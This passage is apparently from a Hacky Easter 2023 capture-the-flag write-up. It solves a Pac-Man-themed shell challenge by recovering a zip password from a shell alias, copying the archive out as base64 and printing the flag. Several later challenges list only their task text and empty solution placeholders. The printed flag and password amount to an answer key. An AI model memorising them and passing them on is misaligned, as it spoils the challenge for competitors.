⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡁⠀
```

The text is Esperanto, Google translates it as

*Blinky, also known as Akabei, is the leader of the Ghosts and Pac-Man's archenemy. He is also depicted as the most aggressive ghost who always chases Pac-Man, and is hard to shake once he starts. He can have a temper, and is good friends with Pinky, Inky, and Clyde. He also has a daughter named Yum-Yum. While originally the main antagonist in the first Pac-Man arcade game, his antagonistic role of the franchise has been largely diminished to an ally in recent incarnations, although he is still considered the series-de facto main antagonist in remakes of the first game and by older fans.*

We also find another directory that was previously hidden from us by the `ls` alias, in it we find a zip file (with a curious `.fzip` extension):

```bash
ab81e1e4280b:~$ ls
about.txt  blinky     flag.txt   home
ab81e1e4280b:~$ ls home/
blinky
ab81e1e4280b:~$ ls home/blinky/
blinkyflag.fzip
ab81e1e4280b:~$ cd home/blinky/
ab81e1e4280b:~/home/blinky$ unzip blinkyflag.fzip
Archive:  blinkyflag.fzip
[blinkyflag.fzip] flag.txt password:
password incorrect--reenter:
password incorrect--reenter:
   skipping: flag.txt                incorrect password
```

We are told we don't need to brutforce of guess the password, so there must be a hint to the password around here somewhere..

We look more closely to the aliases they set up, and see

```bash
alias fzip='/usr/bin/zip -P "/bin/fyunzip"'
```

ah! they fzipped it, which was an alias for zipping with password `/bin/funzip`

```bash
ab81e1e4280b:~/home/blinky$ unzip -P "/bin/funzip" blinkyflag.fzip
Archive:  blinkyflag.fzip
error:  cannot create flag.txt
        Permission denied
```

arg, so close, but we don't have permissions to create the unzipped file..

let's just get the zip file off the server and do it locally

```
ab81e1e4280b:~/home/blinky$ cat blinkyflag.fzip | base64
UEsDBAoACQAAABCUNlVt6MFvLgAAACIAAAAIABwAZmxhZy50eHRVVAkAAyCOLGMgjixjdXgLAAEE
9QEAAAQUAAAAUr8PpJEFxM8HYAIupC/n3QYqp8g44yt7Z/fJ6CdpTcNVM403V0iMcz9C8hb3DFBL
Bwht6MFvLgAAACIAAABQSwECHgMKAAkAAAAQlDZVbejBby4AAAAiAAAACAAYAAAAAAABAAAApIEA
AAAAZmxhZy50eHRVVAUAAyCOLGN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAEAAQBOAAAAgAAAAAAA
```

and then locally:

```
$ echo "UEsDBAoACQAAABCUNlVt6MFvLgAAACIAAAAIABwAZmxhZy50eHRVVAkAAyCOLGMgjixjdXgLAAEE
9QEAAAQUAAAAUr8PpJEFxM8HYAIupC/n3QYqp8g44yt7Z/fJ6CdpTcNVM403V0iMcz9C8hb3DFBL
Bwht6MFvLgAAACIAAABQSwECHgMKAAkAAAAQlDZVbejBby4AAAAiAAAACAAYAAAAAAABAAAApIEA
AAAAZmxhZy50eHRVVAUAAyCOLGN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAEAAQBOAAAAgAAAAAAA
" | base64 -d > pacman.fzip
$ unzip -P "/bin/funzip" pacman.fzip
Archive:  pacman.fzip
 extracting: flag.txt
$ cat flag.txt
he2023{al1asses-4-fUn-and-pr0fit}

```

whoo!!

that was fun :)

**Egg**

```
he2023{al1asses-4-fUn-and-pr0fit}
```


### Going Round

**Challenge**

I got a flag, but it's encrypted somehow:
`ip0232j{1t_x_v0z4b3bm__v4xvq}a`

It was created using the following service:

http://ch.hackyeaster.com:2305

Note: The service is restarted every hour at x:00.

**Solution**

**Egg**

```
he2023{}
```


### Numbers Station

**Challenge**

"Testing, testing, one, two, one, zero.." - the bunnies found a strange radio station when looking for uplifting BunnyBop; can you find out what the nice Spanish lady is saying?

[numbers.mp3](writeupfiles/numbers.mp3)

**Solution**

**Egg**

```
he2023{}
```


### Igor's Gory Passwordsafe

**Challenge**

You found the following letter:

Hi Peter

Thanks again for your help in cryptography to make the passwordsafe secure. Now

    The passwords of the user are stored in a irreversible way (bcrypt)
    All passwords in the safe are encrypted by a strong symmetric key

Kind regards, Roy

Open the passwordsafe at at http://ch.hackyeaster.com:2312 to get your 🚩 flag.

Note: The service is restarted every hour at x:00.

**Solution**

**Egg**

```
he2023{}
```


### Singular

**Challenge**

Wow, so many flags!

Find the real flag, which is unique in multiple ways.

[singular.zip](writeupfiles/singular.zip)

Hint: This one can be solved with linux commands, with a one-liner.

**Solution**

**Egg**

```
he2023{}
```

## Level 6

### Title

**Challenge**

**Solution**

**Egg**

```
he2023{}
```


